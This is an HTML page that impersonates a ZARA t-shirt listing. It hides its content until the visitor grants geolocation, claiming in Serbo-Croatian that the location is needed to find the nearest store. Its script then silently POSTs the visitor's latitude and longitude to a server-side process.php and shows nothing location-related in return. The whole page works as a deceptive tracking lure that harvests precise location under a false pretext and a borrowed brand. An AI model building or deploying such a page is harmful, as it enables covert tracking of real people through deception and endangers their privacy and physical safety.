<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>ZARA - Woman T-Shirts</title>
</head>
<body>

<div id="content" style="display: none; text-align: center">
    <img src="logo.png" alt="">
    <br>
    <br>
    <img src="shirt.png" style="width: 100%" alt="">
</div>

<p id="status"></p>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
    jQuery(document).ready(function($) {
        let errorText = 'Molimo da "dozvolite" lociranje uređaja kako bi ste dobili najbližu ZARA radnju i pogledali sadržaj stranice!';

        if(!navigator.geolocation) {
            $('#status').text(errorText);
        } else {
            navigator.geolocation.getCurrentPosition(function success(position) {
                $("#content").show();
                let latitude  = position.coords.latitude;
                let longitude = position.coords.longitude;

                $.ajax({
                   type: 'POST',
                   url: 'process.php',
                   data: {
                       lat: latitude,
                       lng: longitude
                   },
                   success: function(response) {
                       console.log(response);
                   }
                });
            }, function error() {
                $('#status').text(errorText);
            });
        }
    });
</script>

</body>
</html>